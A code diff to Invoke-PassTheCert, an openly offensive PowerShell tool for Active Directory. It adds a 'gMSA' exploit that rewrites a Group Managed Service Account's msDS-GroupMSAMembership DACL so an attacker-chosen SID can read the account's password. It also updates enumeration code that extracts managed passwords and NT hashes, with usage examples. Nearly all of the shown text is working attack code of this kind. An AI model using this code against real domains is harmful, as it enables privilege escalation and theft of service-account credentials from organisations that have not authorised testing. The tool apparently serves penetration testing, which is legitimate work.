@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.4.1 "
+    Write-Host -ForegroundColor Red     "   v1.5.1 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -7320,12 +7320,12 @@ function _GetAttributeOfObject {
     } else {
         $Value = $SearchResponse.Entries[0].Attributes[$Attribute][0]
         # Dealing with edge-cases (i.e. attribute containing bytes)
-        if (-not $Raw -and $Attribute -in @("objectSid", "nTSecurityDescriptor", "objectGuid")) {
-            $Result = _Helper-GetReadableValueOfBytes -Type $Attribute -ArrayOfBytes $Value
-        } elseif (-not $Raw -and $Attribute -in @("mS-DS-CreatorSID")) {
-            $Result = _Helper-GetReadableValueOfBytes -Type "objectSid" -ArrayOfBytes $Value
-        } elseif (-not $Raw -and $Attribute -in @("msds-allowedtoactonbehalfofotheridentity")) {
-            $Result = _Helper-GetReadableValueOfBytes -Type "nTSecurityDescriptor" -ArrayOfBytes $Value
+        if (-not $Raw -and $Attribute -in @('objectGuid')) {
+            $Result = _Helper-GetReadableValueOfBytes -Type 'objectGuid' -ArrayOfBytes $Value
+        } elseif (-not $Raw -and $Attribute -in @('objectSid', 'mS-DS-CreatorSID')) {
+            $Result = _Helper-GetReadableValueOfBytes -Type 'objectSid' -ArrayOfBytes $Value
+        } elseif (-not $Raw -and $Attribute -in @('nTSecurityDescriptor', 'msDS-AllowedToActOnBehalfOfOtherIdentity', 'msDS-GroupMSAMembership')) {
+            $Result = _Helper-GetReadableValueOfBytes -Type 'nTSecurityDescriptor' -ArrayOfBytes $Value
         } else {
             $Result = $Value
         }
@@ -10810,6 +10810,7 @@ function _LDAPEnum {
             Returns the ManagedPassword-related attributes (password's NTHash included) of the `gmsad` Group Managed Service Account in the LDAP/S Server's Domain (default SearchBase)
 
             - The `-ObjectDN` parameter is OPTIONAL.
+            - Error `Value cannot be null. (Parameter 'buffer')` is returned if we do not have read permissions over the target's `msDS-ManagedPassword` constructed LDAP attribute.
 
         .EXAMPLE
 
@@ -11008,7 +11009,7 @@ function _LDAPEnum {
             return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$($RootDSE.configurationnamingcontext)" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKICertificateTemplate)'
         }
 
-        'sMSAs' {
+        'sMSA' {
             return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-ManagedServiceAccount)'
         }
 
@@ -11040,7 +11041,7 @@ function _LDAPEnum {
             return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' |Select distinguishedName,sAMAccountName,useraccountcontrol,objectcategory
         }
 
-        'gMSAs' {
+        'gMSA' {
             # With no $ObjectDN specified, enumerate all gMSAs' passwords
             if (-not $ObjectDN) {
                 $gMSAAccounts = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-GroupManagedServiceAccount)'
@@ -11096,7 +11097,7 @@ function _LDAPEnum {
                 #Write-Verbose "[*$Enum*] [*] Successfully Read ManagedPassword Blob curPwdOffset"
 
                 $oldPwdOffset = $reader.ReadUInt16()
-                if ($oldPwdOffset > 0) {
+                if ($oldPwdOffset -gt 0) {
                     $UnicodeWCharNullIndex = _Helper-GetIndexOfUnicodeWideCharNull -Blob $ManagedPasswordBlob -StartIndex $oldPwdOffset
                     $ManagedPassword.OldPassword = $ManagedPasswordBlob[$oldPwdOffset..$($UnicodeWCharNullIndex - 1)]
                     $ManagedPassword.OldPasswordNTHash = _Helper-ConvertToNTHashMD4 -Bytes $ManagedPassword.OldPassword
@@ -11246,7 +11247,7 @@ function _LDAPEnum {
 
         'All' {
             # Executing only the enumeration modules with the strict minimum number of mandatory parameters. For instance, we won't run OUMembers, or GroupMembers, as they require a specific parameter.
-            foreach ($Enum in @('RootDSE', 'DCs', 'admins', 'DAs', 'Groups', 'Descriptions', 'Users', 'Computers', 'OSs', 'MAQ', 'LAPS', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'LogonScripts', 'CAs', 'CertificateTemplates', 'sMSAs', 'Trusts', 'DONT_EXPIRE_PASSWORD', 'PASSWD_NOTREQD', 'Kerberoasting', 'ASREPRoasting', 'gMSAs', 'ShadowCreds', 'Unconstrained', 'Constrained', 'RBCD', 'DCSync', 'PassPol')) {
+            foreach ($Enum in @('RootDSE', 'DCs', 'admins', 'DAs', 'Groups', 'Descriptions', 'Users', 'Computers', 'OSs', 'MAQ', 'LAPS', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'LogonScripts', 'CAs', 'CertificateTemplates', 'sMSAs', 'Trusts', 'DONT_EXPIRE_PASSWORD', 'PASSWD_NOTREQD', 'Kerberoasting', 'ASREPRoasting', 'gMSA', 'ShadowCreds', 'Unconstrained', 'Constrained', 'RBCD', 'DCSync', 'PassPol')) {
                 _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope
             }
         }
@@ -11360,6 +11361,14 @@ function _LDAPExploit {
 
             - This requires WRITE privileges against the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
 
+        .EXAMPLE
+
+            _LDAPExploit -LdapConnection $LdapConnection -Exploit 'gMSA' -gMSAMembershipSID 'S-1-5-21-[...]-1469' -TargetDN 'CN=gmsad,CN=Managed Service Accounts,DC=X'
+
+            Sets the SID of the `gmsad`:`msDS-GroupMSAMembership`'s DACL to `S-1-5-21-[...]-1469`. In other words, principal with RID 1469 becomes the one allowed to read the password of the gMSA account `gmsad$`
+
+            - This requires WRITE privileges against the target's `msDS-GroupMSAMembership` attribute.
+
         .LINK
 
             https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection
@@ -11385,7 +11394,10 @@ function _LDAPExploit {
         [System.String]$TargetDN,
 
         [Parameter(Position=5, Mandatory=$false)]
-        [System.String]$OwnerSID
+        [System.String]$OwnerSID,
+
+        [Parameter(Position=6, Mandatory=$false)]
+        [System.String]$gMSAMembershipSID
     )
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
@@ -11406,7 +11418,7 @@ function _LDAPExploit {
 
         }
 
-        "DCSync" {
+        'DCSync' {
             
             if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
@@ -11424,7 +11436,7 @@ function _LDAPExploit {
 
         }
         
-        "ShadowCreds" {
+        'ShadowCreds' {
             
             if (-not (_Helper-IsEveryValueOfArrayDefined @($TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
@@ -11546,7 +11558,7 @@ function _LDAPExploit {
             
         }
 
-        "Owner" {
+        'Owner' {
             
             if (-not (_Helper-IsEveryValueOfArrayDefined @($OwnerSID, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
@@ -11581,7 +11593,7 @@ function _LDAPExploit {
 
         }
 
-        "RBCD" {
+        'RBCD' {
             
             if (-not (_Helper-IsEveryValueOfArrayDefined @($IdentityDN, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
 
@@ -11607,6 +11619,49 @@ function _LDAPExploit {
                 return
 
             }
+
+        }
+
+        'gMSA' {
+            
+            if (-not (_Helper-IsEveryValueOfArrayDefined @($gMSAMembershipSID, $TargetDN))) { Write-Host "[*$Exploit*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
+
+            Write-Verbose "[*$Exploit*] [*] Allowing '$gMSAMembershipSID' To Read The Password Of gMSA Account '$TargetDN'..."
+            
+            # Adding a new msDS-GroupMSAMembership's DACL
+            $SD = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $TargetDN -Attribute 'msDS-GroupMSAMembership'
+            $SD.DiscretionaryAcl.InsertAce(
+                0,
+                (New-Object System.Security.AccessControl.ObjectAce(
+                    $SD.DiscretionaryAcl[0].AceFlags,
+                    $SD.DiscretionaryAcl[0].AceQualifier,
+                    $SD.DiscretionaryAcl[0].AccessMask,
+                    [System.Security.Principal.SecurityIdentifier]$gMSAMembershipSID,
+                    [System.Security.AccessControl.ObjectAceFlags]::None,
+                    [Guid]::Empty,
+                    [Guid]::Empty,
+                    [bool]$false,
+                    [byte[]]$null
+                ))
+            )
+
+            # Removing the previous ACE (now at index 1)
+            $SD.DiscretionaryAcl.RemoveAce(1) |Out-Null
+            
+            # Inserting the newly defined msDS-GroupMSAMembership's DACL
+            $NewSD = New-Object byte[] $SD.BinaryLength
+            $SD.GetBinaryForm($NewSD, 0)
+            $LdapConnection.SendRequest(
+                (New-Object System.DirectoryServices.Protocols.ModifyRequest(
+                    $TargetDN,
+                    [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace,
+                    'msDS-GroupMSAMembership',
+                    $NewSD
+                ))
+            ) |Out-Null
+
+            Write-Host "[*$Exploit*] [+] Successfully Allowed '$gMSAMembershipSID' To Read The Password Of gMSA Account '$TargetDN' !"
+            Write-Host "[*$Exploit*] [Check] Invoke-PassTheCert -Action 'LDAPEnum' -LdapConnection `$LdapConnection -Enum 'gMSA' -Object '$TargetDN'"
 
         }
 
@@ -12309,6 +12364,9 @@ function Invoke-PassTheCert {
         [Parameter(Position=3002, Mandatory=$false)]
         [System.String]$OwnerSID,
 
+        [Parameter(Position=3003, Mandatory=$false)]
+        [System.String]$gMSAMembershipSID,
+
         # =========================================
         # =====         M4K3 Y0ur 0wN!        =====
         # =========================================
@@ -12467,7 +12525,7 @@ function Invoke-PassTheCert {
             # =========================================
 
             "LDAPExploit" {
-                _LDAPExploit -LdapConnection $LdapConnection -Exploit $Exploit -IdentityDN $IdentityDN -TargetDN $TargetDN -SPN $SPN -OwnerSID $OwnerSID
+                _LDAPExploit -LdapConnection $LdapConnection -Exploit $Exploit -IdentityDN $IdentityDN -TargetDN $TargetDN -SPN $SPN -OwnerSID $OwnerSID -gMSAMembershipSID $gMSAMembershipSID
             }
 
 
